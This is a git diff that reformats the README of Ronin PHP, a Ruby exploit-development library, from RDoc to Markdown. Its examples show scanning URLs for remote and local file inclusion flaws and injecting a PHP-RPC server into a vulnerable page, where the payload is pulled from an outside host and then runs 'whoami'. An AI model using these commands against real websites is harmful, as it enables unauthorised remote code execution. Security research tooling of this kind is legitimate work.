@@ -1,4 +1,4 @@
-= Ronin PHP
+# Ronin PHP
 
 * http://ronin.rubyforge.org/php/
 * http://github.com/postmodern/ronin-php
@@ -6,7 +6,7 @@
 * http://groups.google.com/group/ronin-ruby
 * irc.freenode.net #ronin
 
-== DESCRIPTION:
+## DESCRIPTION:
 
 Ronin PHP is a Ruby library for Ronin that provides support for PHP
 related security tasks.
@@ -15,28 +15,28 @@ Ronin is a Ruby platform for exploit development and security research.
 Ronin allows for the rapid development and distribution of code, exploits
 or payloads over many common Source-Code-Management (SCM) systems.
 
-=== Ruby
+### Ruby
 
 Ronin's Ruby environment allows security researchers to leverage Ruby with
 ease. The Ruby environment contains a multitude of convenience methods
 for working with data in Ruby, a Ruby Object Database, a customized Ruby
 Console and an extendable command-line interface.
 
-=== Extend
+### Extend
 
 Ronin's more specialized features are provided by additional Ronin
 libraries, which users can choose to install. These libraries can allow
 one to write and run Exploits and Payloads, scan for PHP vulnerabilities,
 perform Google Dorks  or run 3rd party scanners.
 
-=== Publish
+### Publish
 
 Ronin allows users to publish and share code, exploits, payloads or other
 data via Overlays. Overlays are directories of code and data that can be
 hosted on any SVN, Hg, Git or Rsync server. Ronin makes it easy to create,
 install or update Overlays.
 
-== FEATURES:
+## FEATURES:
 
 * Provides tests for Location File Inclusion (LFI) and Remote File
   Inclusion (RFI) that are built into the URI::HTTP class.
@@ -45,15 +45,15 @@ install or update Overlays.
   environments.
 * Provides an AJAX PHP-RPC Console.
 
-== SYNOPSIS:
+## SYNOPSIS:
 
-* Start the Ronin console with Ronin PHP preloaded:
+Start the Ronin console with Ronin PHP preloaded:
 
     $ ronin-php
 
-== EXAMPLES:
+## EXAMPLES:
 
-* Test for Remote File Inclusion (RFI):
+Test for Remote File Inclusion (RFI):
 
     require 'ronin/php/rfi'
 
@@ -61,17 +61,17 @@ install or update Overlays.
     url.has_rfi?
     # => true
 
-* Get the first viable RFI vulnerability:
+Get the first viable RFI vulnerability:
 
     url.first_rfi
     # => #<Ronin::PHP::RFI: ...>
 
-* Scan a URL for RFI vulnerabilities:
+Scan a URL for RFI vulnerabilities:
 
     url.rfi_scan
     # => [#<Ronin::PHP::RFI: ...>, ...]
 
-* Inject a PHP-RPC Server into a RFI vulnerable URL:
+Inject a PHP-RPC Server into a RFI vulnerable URL:
 
     require 'ronin/rpc/php'
 
@@ -79,12 +79,12 @@ install or update Overlays.
     client.exec('whoami')
     # => "www-data"
 
-* Get a direct URL to the AJAX interface of the PHP-RPC Server:
+Get a direct URL to the AJAX interface of the PHP-RPC Server:
 
     client.url
     # => "http://www.example.com/page.php?en=http://ronin.rubyforge.org/static/ronin/php/rpc/server.min.php?"
 
-* Test for Local File Inclusion (LFI):
+Test for Local File Inclusion (LFI):
 
     require 'ronin/php/lfi'
 
@@ -92,26 +92,26 @@ install or update Overlays.
     url.has_lfi?
     # => true
 
-* Get the first viable LFI vulnerability:
+Get the first viable LFI vulnerability:
 
     url.first_lfi
     # => #<Ronin::PHP::LFI: ...>
 
-* Scan a URL for LFI vulnerabilities:
+Scan a URL for LFI vulnerabilities:
 
     url.lfi_scan
     # => [#<Ronin::PHP::LFI: ...>, ...]
 
-== REQUIREMENTS:
+## REQUIREMENTS:
 
-* {ronin}[http://ronin.rubyforge.org/] >= 0.3.0
-* {ronin-web}[http://ronin.rubyforge.org/web/] >= 0.2.0
+* [ronin](http://ronin.rubyforge.org/) >= 0.3.0
+* [ronin-web](http://ronin.rubyforge.org/web/) >= 0.2.0
 
-== INSTALL:
+## INSTALL:
 
-  $ sudo gem install ronin-php
+    $ sudo gem install ronin-php
 
-== LICENSE:
+## LICENSE:
 
 Ronin PHP - A Ruby library for Ronin that provides support for PHP
 related security tasks.
